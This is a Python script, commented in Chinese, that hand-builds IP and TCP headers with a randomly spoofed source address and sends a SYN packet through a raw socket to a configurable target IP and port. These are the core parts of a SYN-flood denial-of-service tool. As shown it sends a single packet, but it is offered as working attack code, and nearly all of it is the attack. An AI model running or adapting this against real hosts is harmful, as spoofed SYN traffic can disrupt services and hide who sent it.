import socket
import random
import struct
import time
import os


# 随机生成源IP地址
def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))


# 计算校验和
def checksum(data):
    s = 0
    # 逐字节相加
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
        s += w
    s = (s >> 16) + (s & 0xFFFF)
    s += (s >> 16)
    return ~s & 0xFFFF


# 构建TCP头
def build_tcp_header(source_ip, dest_ip, source_port, dest_port, seq, ack, flags):
    # 16位校验和
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_offset = 5  # 只考虑标准的20字节TCP头

    # TCP头结构
    tcp_header = struct.pack(
        "!HHLLBBHHH",
        source_port,
        dest_port,
        seq,
        ack,
        (tcp_offset << 4) | 0,  # Data Offset, reserved, and flags
        flags,
        8192,  # 窗口大小
        0,  # 校验和暂时为0，计算后再更新
        0  # 紧急指针
    )

    # 伪头部
    pseudo_header = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(dest_ip),
        placeholder,
        protocol,
        len(tcp_header)  # 这里是TCP长度，应该是20字节
    )

    # 计算校验和
    psh = pseudo_header + tcp_header
    tcp_checksum = checksum(psh)

    # 更新校验和字段
    tcp_header = struct.pack(
        "!HHLLBBHHH",
        source_port,
        dest_port,
        seq,
        ack,
        (tcp_offset << 4) | 0,  # Data Offset, reserved, and flags
        flags,
        8192,  # 窗口大小
        tcp_checksum,
        0  # 紧急指针
    )

    return tcp_header


# 构建IP头
def build_ip_header(source_ip, dest_ip):
    ip_ihl = 5  # IP头长度，5表示20字节
    ip_ver = 4  # IPv4
    ip_tos = 0  # 服务类型
    ip_tot_len = 0  # 总长度，由系统计算
    ip_id = random.randint(1, 65535)  # 唯一标识符
    ip_frag_off = 0  # 不分片
    ip_ttl = 255  # 生存时间
    ip_protocol = socket.IPPROTO_TCP  # 使用TCP协议
    ip_check = 0  # 校验和暂时为0，计算后再更新
    ip_source_address = socket.inet_aton(source_ip)
    ip_dest_address = socket.inet_aton(dest_ip)

    # 构建IP头结构
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        (ip_ver << 4) + ip_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_protocol,
        ip_check,
        ip_source_address,
        ip_dest_address
    )

    return ip_header


# 构建并发送SYN包
def send_syn_packet(target_ip, target_port):
    source_ip = generate_random_ip()  # 随机源IP
    source_port = random.randint(1024, 65535)  # 随机源端口
    seq = random.randint(1000, 99999)  # 随机初始序列号
    ack = 0  # 这是一个SYN包，所以ACK字段为0
    flags = 0x02  # SYN标志

    # 构建IP头和TCP头
    ip_header = build_ip_header(source_ip, target_ip)
    tcp_header = build_tcp_header(source_ip, target_ip, source_port, target_port, seq, ack, flags)

    # 构建完整数据包
    packet = ip_header + tcp_header

    # 发送数据包
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        raw_socket.sendto(packet, (target_ip, 0))
        print(f"发送SYN包：源IP={source_ip}，目标IP={target_ip}，目标端口={target_port}")
    except Exception as e:
        print(f"发送失败：{e}")


# 目标IP和端口
target_ip = "172.16.0.1"  # 请替换为目标IP
target_port = 3000  # 可以根据需要修改目标端口

# 发送SYN包
send_syn_packet(target_ip, target_port)



